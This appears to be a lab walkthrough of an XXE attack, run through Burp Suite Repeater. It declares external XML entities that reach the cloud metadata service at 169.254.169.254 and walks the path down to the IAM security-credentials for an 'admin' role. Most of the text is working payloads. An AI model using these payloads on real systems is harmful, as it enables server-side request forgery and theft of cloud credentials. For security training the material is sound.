Since we are proxying the requests through Burp Suite, we can go to `Proxy > HTTP History` to view the request.

We can see that the request contains an XML entity.

Let's forward this request to the `Repeater` for further modification.

Once in the `Repeater` tab, declare the following internal entity after the XML prologue:

```
<!DOCTYPE test 
[<!ENTITY test SYSTEM "http://169.254.169.254/">]
>
```

Let's add the `latest` endpoint to the entity.

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/">]
```

Let's add the `meta-data` endpoint to the entity.

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]
```

[<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/">]
```

[<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]
```

```
[<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/">]
```
